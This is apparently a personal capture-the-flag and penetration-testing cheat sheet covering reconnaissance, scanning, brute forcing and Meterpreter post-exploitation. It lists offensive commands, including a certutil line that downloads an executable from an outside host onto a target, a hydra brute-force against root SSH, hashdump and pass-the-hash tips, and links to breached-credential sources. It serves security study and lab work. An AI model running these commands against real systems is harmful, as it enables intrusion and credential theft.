# CTFdeets

## General penetration steps

### Information Gathering - Identifying targets

Email addresses

* https://hunter.io to find email addresses and email patterns.
* Gather breached credentials with `breach-parse`
  * Consider other breached data sources: 
    * https://gist.github.com/alfredgamulo/6259986662e840da3409d1ff8c3362e7
    * https://digitalforensicstips.com/2019/11/using-bulk-extractor-for-quick-osint-wins/
    * https://pwnedlist.com
    * https://snusbase.com/
    * https://www.dehashed.com/
    * https://bit.ly/deepwebz

Subdomains

* `theharvester` is a tool in kali that can find emails, subdomains, IP addresses
* `sublist3r` can enumerate website subdomains
  * `apt install sublist3r`
* https://crt.sh uses certificates to enumerate subdomains
* `amass` yet another subdomain lister

After finding subdomains, `tomnomnom httpprobe` can take a list and show what sites are running.

Find what a website is built with:
* https://builtwith.com
* `wappalyzer` browser plugin
* `whatweb` yet another website technology enumerator

Intercept web traffic using:
* `Burp Suite`
* `Foxy Proxy`

Don't forget Google dorking or social media sites.

### Scanning & Enumeration

Machines and Ports

* `netdiscover` to find machines
* `nmap -T4 -p- -A` to find open ports
* `nmap -sU -T4 -p <host>`

Load up IP addresses and look for default or error pages

* `nikto`

Default pages, error pages, or information about the underlying architecture can be filed as **information disclosure**

Tools if `smb` is discovered after `nmap` scan:
* `msfconsole`
  * `search smb` - try for example: `use auxiliar/scanner/smb/smb_version`
* `smbclient` try to connect to it and try the individual sharenames in the server path. `smbclient -L \\\\10.10.10.4\\$ADMIN` leading slashes escape in linux.

Search for exploits on the services/ports and versions that were found:
* https://www.exploit-db.com/
* https://www.rapid7.com/db/

Other scanning tools:
* `masscan -p1-65535 --rate 1000 <ip addr>` this tool scans the whole internet, make sure to specify ip so that you're not hitting disallowed servers
* `msf5 > search portscan` use scanning options from metasploit
* https://www.tenable.com/downloads/nessus

### Exploitation Basics

Try to obtain shell

* Reverse shells
  * most common shell exploit
* Bind shells
  * useful if need to get around LHOST NAT or firewalls
  
Know the difference between `staged` and `non-staged` payloads. There can be identical attack patterns but the staging of the payload causes one way to work and one way to fail. For example, if one metasploit exploit fails to complete, try to search for other payloads. `set payload linux/x86` (then tab autocomplete to enumerate options). Try a single non-staged payload or the opposite.

Brute force tools:
* `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<ip>:22 -t 4 -V` attempt root login on target IP
* `msf5 > use auxiliary/scanner/ssh/ssh_login`

Password Spraying & Credential Stuffing
* just try to use the creds found in information gathering to login to anything
  * `pitchfork` feature in Burp Suite `Intruder` tab

Found a default web page and want to find viable paths?
* `dirbuster`
* `gobuster`

Payloads other than msf:
* `msfvenom`
  * for example, can create a reverse shell tomcat war file

Download file to windows or linux:
* `certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
* `python -m pyftpdlib 21` on host to start ftp server
* `python -m SimpleHTTPServer 80` from lhost and get from rhost

Escalate user:
* `linEnum`
* `LinuxPrivChecker`

Find vulns on windows while logged in
* `rasta mouse`/`sherlock`
* GDSSecurity `Windows-Exploit-Suggester`

## Meterpreter etc
`meterpreter > getuid`
* NT AUTHORITY\SYSTEM - highest user on windows

`meterpreter > sysinfo`
* Get information on system, see if it matches earlier scans

`meterpreter > help`
* find all the commands you can do while connected to a system with a meterpreter shell

`meterpreter > hashdump`
* try to crack the passwords, or try to "pass the hash"

Not escaleted, but got a meterpreter shell:

`meterpreter > background`

`msf5 > search suggester`

use the suggester to find possible root escalation tactics
